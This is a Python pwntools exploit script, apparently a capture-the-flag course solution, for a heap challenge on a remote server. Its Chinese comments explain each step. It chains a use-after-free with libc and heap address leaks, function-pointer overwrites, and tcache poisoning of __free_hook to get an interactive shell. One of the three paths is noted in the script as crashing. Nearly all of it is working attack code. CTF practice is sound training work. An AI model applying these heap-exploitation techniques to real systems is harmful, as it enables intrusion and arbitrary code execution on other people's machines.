#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ["tmux", "splitw", "-h", "-l", "165"]
# context.log_level = "debug"

if len(sys.argv) != 2:
    print("./demo_final 1 - UAF              --> overwrite func ptr          --> system(\"/bin/sh\")")
    print("./demo_final 2 - hijack name ptr  --> overwrite next chk func ptr --> one gadget")
    print("./demo_final 3 - heap overflow    --> tcache poisoning            --> __free_hook to system --> free(\"/bin/sh\")")
    exit(1)
    
# r = process('./final/share/final')
r = remote("edu-ctf.zoolab.org", 30210)

def buy(idx, nlen, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('cat or dog ?\n> ', 'cat')
    r.sendlineafter("len of name:\n> ", str(nlen))
    r.sendafter('name:\n> ', name)
    r.sendlineafter('where to keep (0 or 1) ?\n> ', str(idx))

def release(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('which one to release (0 or 1) ?\n> ', str(idx))

def change(idx, nlen, name, len_change):
    r.sendlineafter('> ', '3')
    r.sendlineafter('which one to change (0 or 1) ?\n> ', str(idx))
    if len_change == True:
        r.sendlineafter('will the len of name change (y/n) ?\n> ', 'y')
        r.sendlineafter("new len of name:\n> ", str(nlen))
    else:
        r.sendlineafter('will the len of name change (y/n) ?\n> ', 'n')
    r.sendafter('new name:\n> ', name)

def play(idx):
    r.sendlineafter('> ', '4')
    r.sendlineafter('which one to play (0 or 1) ?\n> ', str(idx))

# 總結，這題最大的問題是 Use After Free 的問題，才可以達成一系列的攻擊手段

# 1. 首先 allocate chunk size 0x420，釋放後再次取得，利用殘留在 chunk 的 unsorted bin 位址來 leak libc
# 這裡至所以可以 Leak Libc 的原因，是來自於 Unsorted Bin 中的第一個 Chunk OR 最後一個 Chunk 會指向 Main Arena，而剛好 main_arena 
# 又在 libc 的 .data 中，所以可以用來 leak libc 的基值
# https://b0ldfrev.gitbook.io/note/pwn/li-yong-mainarena-xie-lou-libc-ji-zhi
# https://github.com/bash-c/main_arena_offset/blob/master/main_arena

buy(0, 0x410, 'dummy')
buy(1, 0x410, 'dummy') # 由於 freed chunk 相鄰 top chunk 時會觸發 consolidate，因此多放一塊 chk 來避免
release(0)
buy(0, 0x410, 'AAAAAAAA')
play(0)

r.recvuntil('A'*8)
# 從 bk 留下的 unsorted bin address 來 leak
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
_system = libc + 0x55410
__free_hook = libc + 0x1eeb28
one_shot = libc + 0xe6c84
binsh = libc + 0x1b75aa
info(f"libc: {hex(libc)}")

# 2. 再利用 UAF 去 leak tcache 的 fd，得到 heap address
buy(0, 0x10, 'dummy')
buy(1, 0x10, 'dummy')
release(0)
release(1)
# 這時候其實就有兩個 memory leak 了，之前那兩個大塊 Chunk 並沒有被正確的清掉
# 從 heap cmd 中也可以看到
# gdb.attach(r, "b buy\nb change\nb release")
play(1)
r.recvuntil('MEOW, I am a cute ')
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0xb40
info(f"heap: {hex(heap)}")

if sys.argv[1] == '1':
    # 2. 從 tcache 當中依序取得 animals[1], animals[0]，分別 assign 給 animals[1]，
    #    以及覆蓋成任意資料 animals[1]->name，而 name 可控，因此可以覆蓋原本的 animals[0]
    #    - type: b'/bin/sh\x00' + b'A'*0x8
    #    - len: 0xdeadbeef
    #    - name: 0xdeadbeef
    #    - bark: system
    # 取一塊新的 0x28 (Chunk size will be 0x30) name，其實會取到上一塊原本是 animal 0 的記憶體
    # 但 animal[0] 有 UAF 的問題，這就可以 Hijack 了
    buy(1, 0x28, b'/bin/sh\x00' + b'A'*0x8 + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(_system))
    # 3. get shell
    play(0)
elif sys.argv[1] == '2':
    # 2. 同上，不過這次要控 name 與 len，使其可以寫到其他 chunk 內的資料
    #    - type: b'A'*0x10
    #    - len: 0x10000
    #    - name: heap
    #    - bark: 0xdeadbeef
    # 一樣是透過 name 去把 animal[0] 那塊記憶體救活，這樣他就可以被利用了
    buy(1, 0x28, b'A'*0x10 + p64(0x10000) + p64(heap + 0xbe0) + p64(0xdeadbeef))
    # 這是說，heap 又被切一塊 0x28 大小的 Animal 下來
    # 至所以要這樣做的原因是因為，我們可控的 Input 只有在 name 指向的位置
    # 只靠一次寫是沒有辦法把 rsi, rdi 一起清成 null 的目的，所以要這樣兩個一起用
    buy(1, 0x10, 'dummy')
    # 3. 此時 animals[0] 可以寫 0x10000 大小的資料，並且 name 指向 heap+0xbe0，
    #    我們 hijack animals[1] 的 func ptr 成 one gadget 做利用
    #    - type: heap+0x100 (rdi: 指向 NULL 的 pointer)
    #    - len: 0xdeadbeef
    #    - name: heap+0x100 (rsi: 指向 NULL 的 pointer)
    #    - bark: one gadget
    # 沒辦法設 RDX 所以沒辦法執行
    # 0xe6c84 execve("/bin/sh", rsi, rdx)
    # constraints:
    # [rsi] == NULL || rsi == NULL
    # [rdx] == NULL || rdx == NULL
    change(0, 0xffffffff, p64(heap+0x100) + p64(0) + p64(0xdeadbeef) + p64(heap+0x100) + p64(one_shot), False)
    # 4. 可惜 one gadget 中沒有我們都無法滿足條件，因此執行完後程式會 crash
    play(1)
elif sys.argv[1] == '3':
    # 2. 同上，目標是要寫任意大小的
    # gdb.attach(r, "b buy\nb change\nb release")
    buy(1, 0x28, b'A'*0x10 + p64(0x10000) + p64(heap + 0xbe0) + p64(0xdeadbeef))
    # heap + 0xb90 will be left as a leak memory chunk
    buy(1, 0x10, 'dummy') # Dummy for Control
    # heap + 0xbe0 will be placed at tcache 0x30
    release(1)
    # 3. 蓋寫 animals[0] 的 key 時需注意 release() 也會釋放 name 欄位，因此要塞入一個合法的 chunk 位址
    # 這塊其實是在寫 animal[1], heap+0xbe0
    # key will be change to A * 0x8
    # 為什麼要這麼繁瑣的原因是因為，每當一個新的 Chunk 被送進 tcache chain 當中的時候，
    # 都會被 Glibc 重新改寫 fd, bk，所以即使我們早就有權限修改任意位置了，還是要等到他先進 chain 後
    # 再透過 tcache poisoning 來修改 Chain 中的數值
    # 題外話，這邊這兩行 change 跟 release 看起來是多餘的，因為其實只要 count 大於 2 就可以達成了
    # change(0, 0xffffffff, b'A'*0x10 + p64(0xdeadbeef) + p64(heap + 0xb40), False)
    # release(1)
    # 增加 tcache count 2，還順便解掉一個 Memory Leak XD
    change(0, 0xffffffff, b'A'*0x10 + p64(0xdeadbeef) + p64(heap + 0xb90), False)
    release(1)
    # 4. 此時我們可以蓋寫 tcache fd 成 __free_hook - 8，而 __free_hook-8 ~ __free_hook 可以放 "/bin/sh\x00"
    change(0, 0xffffffff, p64(__free_hook - 8), False)
    # 當我們請求 0x28 大小的 chunk，會取得 __free_hook 的位址，寫入 system
    buy(1, 0x28, b'/bin/sh\x00' + p64(_system))
    # 5. get shell
    release(1)
    # 真正爆開的時候是在 Free Name 那塊記憶體的時候，free(name ptr)
    # 但因為 tcache chain 在剛剛已經被 Hijack 掉了
    # 他會直接去吃 __free_hook 的位置
else:
    print("NO :(")
    r.close()
    exit(1)

r.interactive()
